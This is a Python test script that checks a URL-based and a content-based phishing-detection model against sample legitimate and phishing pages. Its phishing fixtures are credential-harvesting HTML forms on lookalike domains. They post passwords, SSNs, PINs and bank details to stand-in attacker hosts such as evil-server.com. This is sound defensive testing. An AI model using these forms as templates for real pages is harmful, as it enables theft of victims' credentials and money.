"""
CORRECT Diagnostic Test - Using REAL Legitimate and Phishing URLs
"""
import joblib
import pandas as pd
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from Data_Preprocessing.feature_extract_2023 import ContentFeatureExtractor
from Data_Preprocessing.feature_extractor import URLFeatureExtractor

print("\n" + "="*80)
print(" 🔍 CORRECT DIAGNOSTIC TEST - REAL URLs")
print("="*80)

# ---------------------------------------------------
# Load Models
# ---------------------------------------------------
print("\n📥 Loading models...")

model_2025 = joblib.load("Models/2025/model_2025.pkl")
feats_2025 = joblib.load("Models/2025/features_2025.pkl")
print("✅ Model 2025 loaded")
print(f"   Classes: {model_2025.classes_}")

model_2023 = joblib.load("Models/2023/model_2023.pkl")
feats_2023 = joblib.load("Models/2023/features_2023.pkl")
print("✅ Model 2023 loaded")
print(f"   Classes: {model_2023.classes_}")

# ---------------------------------------------------
# Test Cases - USING REAL URLs
# ---------------------------------------------------
test_cases = [
    # ========== LEGITIMATE SITES ==========
    {
        "name": "Google (REAL)",
        "url": "https://www.google.com",
        "html": """
        <html>
        <head>
            <title>Google</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="/style.css">
            <script src="/app.js"></script>
        </head>
        <body>
            <img src="/logo.png">
            <form action="/search">
                <input type="text" name="q">
                <input type="submit" value="Search">
            </form>
            <a href="/about">About</a>
            <a href="https://www.facebook.com/google">Facebook</a>
            <p>© 2024 Google LLC</p>
        </body>
        </html>
        """,
        "is_phishing": False
    },
    {
        "name": "YouTube (REAL)",
        "url": "https://www.youtube.com",
        "html": """
        <html>
        <head>
            <title>YouTube</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="/youtube.css">
            <script src="/youtube.js"></script>
        </head>
        <body>
            <img src="/logo.png">
            <img src="/thumb1.jpg">
            <img src="/thumb2.jpg">
            <a href="/watch?v=123">Video</a>
            <a href="https://twitter.com/youtube">Twitter</a>
            <p>© 2024 YouTube</p>
        </body>
        </html>
        """,
        "is_phishing": False
    },
    {
        "name": "Facebook (REAL)",
        "url": "https://www.facebook.com",
        "html": """
        <html>
        <head>
            <title>Facebook</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="/style.css">
            <script src="/react.js"></script>
        </head>
        <body>
            <img src="/logo.png">
            <form action="/login.php" method="post">
                <input type="text" name="email">
                <input type="password" name="pass">
                <input type="submit" value="Log In">
            </form>
            <p>© 2024 Meta</p>
        </body>
        </html>
        """,
        "is_phishing": False
    },
    {
        "name": "PayPal (REAL)",
        "url": "https://www.paypal.com",
        "html": """
        <html>
        <head>
            <title>PayPal</title>
            <meta name="viewport" content="width=device-width">
            <link rel="stylesheet" href="/main.css">
        </head>
        <body>
            <img src="/logo.png">
            <form action="/signin" method="post">
                <input type="email" name="login_email">
                <input type="password" name="login_password">
                <input type="submit" value="Log In">
            </form>
            <a href="/privacy">Privacy</a>
            <a href="/terms">Terms</a>
            <p>© 1999-2024 PayPal</p>
        </body>
        </html>
        """,
        "is_phishing": False
    },
    
    # ========== PHISHING SITES ==========
    {
        "name": "Typosquatting: g00gle.com",
        "url": "https://www.g00gle.com",
        "html": """
        <html>
        <head>
            <title>Google Login</title>
        </head>
        <body>
            <h1>Sign in to your Google Account</h1>
            <form action="http://evil-server.com/steal.php" method="post">
                <input type="text" name="email" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <input type="hidden" name="csrf_token" value="abc123">
                <input type="submit" value="Sign In">
            </form>
        </body>
        </html>
        """,
        "is_phishing": True
    },
    {
        "name": "Phishing: paypal-verify.tk",
        "url": "http://paypal-verify-account.tk/secure/update.php",
        "html": """
        <html>
        <head>
            <title>PayPal - Verify Your Account</title>
        </head>
        <body>
            <h1>⚠️ Urgent: Verify your PayPal account</h1>
            <p>Your account will be suspended within 24 hours unless you verify.</p>
            <form action="http://evil-server.com/steal.php" method="post">
                <input type="text" name="email" placeholder="Email">
                <input type="password" name="password" placeholder="Password">
                <input type="text" name="ssn" placeholder="Social Security">
                <input type="hidden" name="redirect" value="phishing">
                <input type="submit" value="Verify Now">
            </form>
        </body>
        </html>
        """,
        "is_phishing": True
    },
    {
        "name": "Phishing: secure-bank.tk",
        "url": "http://secure-bank-login-verify.tk/update.php",
        "html": """
        <html>
        <head>
            <title>Bank Security Update</title>
        </head>
        <body>
            <h1>🔒 Security Update Required</h1>
            <p>Please update your bank account information immediately.</p>
            <form action="http://attacker.com/collect.php" method="post">
                <input type="text" name="account_number" placeholder="Account Number">
                <input type="password" name="pin" placeholder="PIN">
                <input type="text" name="routing" placeholder="Routing Number">
                <input type="hidden" name="stolen" value="yes">
                <input type="submit" value="Update Account">
            </form>
            <p>Bank</p>
        </body>
        </html>
        """,
        "is_phishing": True
    },
    {
        "name": "Phishing: facebook-security.com",
        "url": "https://www.facebook-security-check.com/verify",
        "html": """
        <html>
        <head>
            <title>Facebook Security Check</title>
        </head>
        <body>
            <img src="facebook_logo.png">
            <h1>Security Check Required</h1>
            <p>We detected unusual activity on your account.</p>
            <form action="http://phishing-site.com/steal" method="post">
                <input type="text" name="email">
                <input type="password" name="password">
                <input type="hidden" name="malicious">
                <input type="submit" value="Verify">
            </form>
        </body>
        </html>
        """,
        "is_phishing": True
    }
]

# ---------------------------------------------------
# Test Both Models
# ---------------------------------------------------
extractor_2025 = URLFeatureExtractor()
extractor_2023 = ContentFeatureExtractor()

print("\n" + "="*80)
print(" 📊 TESTING RESULTS")
print("="*80)

results_2025 = []
results_2023 = []

for test in test_cases:
    print(f"\n{'='*80}")
    print(f"🧪 {test['name']}")
    print(f"{'='*80}")
    print(f"URL: {test['url']}")
    print(f"Expected: {'PHISHING' if test['is_phishing'] else 'LEGITIMATE'}")
    
    # ========== MODEL 2025 (URL) ==========
    print(f"\n🔹 Model 2025 (URL-based):")
    features_2025 = extractor_2025.extract(test['url'])
    df_2025 = pd.DataFrame([features_2025]).reindex(columns=feats_2025, fill_value=0)
    
    proba_2025 = model_2025.predict_proba(df_2025)[0]
    prob_legit_2025 = proba_2025[0]
    prob_phish_2025 = proba_2025[1]
    pred_2025 = prob_phish_2025 > 0.5
    
    print(f"   Probabilities: [Legit={prob_legit_2025:.4f}, Phish={prob_phish_2025:.4f}]")
    print(f"   Prediction: {'PHISHING' if pred_2025 else 'LEGITIMATE'}")
    
    if pred_2025 == test['is_phishing']:
        print(f"   ✅ CORRECT")
        results_2025.append(1)
    else:
        print(f"   ❌ WRONG")
        results_2025.append(0)
    
    # ========== MODEL 2023 (Content) ==========
    print(f"\n🔹 Model 2023 (Content-based):")
    features_2023 = extractor_2023.extract_from_html(test['html'], test['url'])
    df_2023 = pd.DataFrame([features_2023]).reindex(columns=feats_2023, fill_value=0)
    
    proba_2023 = model_2023.predict_proba(df_2023)[0]
    prob_legit_2023 = proba_2023[0]
    prob_phish_2023 = proba_2023[1]
    pred_2023 = prob_phish_2023 > 0.5
    
    print(f"   Probabilities: [Legit={prob_legit_2023:.4f}, Phish={prob_phish_2023:.4f}]")
    print(f"   Prediction: {'PHISHING' if pred_2023 else 'LEGITIMATE'}")
    
    if pred_2023 == test['is_phishing']:
        print(f"   ✅ CORRECT")
        results_2023.append(1)
    else:
        print(f"   ❌ WRONG")
        results_2023.append(0)

# ---------------------------------------------------
# Summary
# ---------------------------------------------------
print(f"\n{'='*80}")
print(" 📊 FINAL SUMMARY")
print(f"{'='*80}")

accuracy_2025 = sum(results_2025) / len(results_2025) * 100
accuracy_2023 = sum(results_2023) / len(results_2023) * 100

print(f"\nModel 2025 (URL-based):      {sum(results_2025)}/{len(results_2025)} ({accuracy_2025:.1f}%)")
print(f"Model 2023 (Content-based):  {sum(results_2023)}/{len(results_2023)} ({accuracy_2023:.1f}%)")

print(f"\n{'='*80}")
print(" 💡 INTERPRETATION")
print(f"{'='*80}")

if accuracy_2025 >= 85:
    print("✅ Model 2025: Working well! URL-based detection is strong.")
else:
    print("⚠️  Model 2025: Needs improvement.")

if accuracy_2023 >= 85:
    print("✅ Model 2023: Working well! Content-based detection is strong.")
else:
    print("⚠️  Model 2023: Limited by HTML-only analysis.")
    print("   → This is EXPECTED! Model 2023 can be fooled by:")
    print("      • Phishing sites with legitimate-looking HTML")
    print("      • Sites that copy real brand HTML/CSS")
    print("   → This is why we need BOTH models in ensemble!")

print(f"\n{'='*80}")
print(" 🎯 WHY ENSEMBLE WORKS")
print(f"{'='*80}")
print("""
Model 2025 catches:
  ✅ Typosquatting (g00gle.com)
  ✅ Suspicious TLDs (.tk, .ml)
  ✅ URL patterns (verify, secure, update)

Model 2023 catches:
  ✅ External form submissions
  ✅ Suspicious input fields (SSN, routing number)
  ✅ Missing security indicators

ENSEMBLE (Both Together):
  ✅✅ Catches BOTH URL and content-based attacks!
  ✅✅ Reduces false positives and false negatives!
""")

print("="*80)